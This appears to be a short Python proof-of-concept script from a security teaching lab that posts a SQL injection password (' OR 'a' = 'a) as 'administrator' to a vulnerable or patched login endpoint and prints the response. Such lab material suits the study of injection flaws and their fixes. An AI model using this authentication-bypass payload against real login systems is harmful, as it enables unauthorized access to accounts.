import json
from urllib.error import URLError
from urllib.request import Request, urlopen

import cli


def main(use_vulnerable_endpoint: bool, url_prefix: str) -> None:
    if use_vulnerable_endpoint:
        url = f"{url_prefix}/vulnerabilities/sqli1/login/"
    else:
        url = f"{url_prefix}/patches/sqli1/login/"

    username = "administrator"
    password = "' OR 'a' = 'a"
    data = {"username": username, "password": password}

    try:
        req = Request(
            url,
            data=json.dumps(data).encode("utf-8"),
            method="POST",
            headers={"Content-Type": "application/json"},
        )

        with urlopen(req) as response:
            print(f"Response: {response.read().decode('utf-8')}")
    except URLError as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    use_vulnerable_endpoint, url_prefix = cli.get_cli_arguments()
    main(use_vulnerable_endpoint, url_prefix)
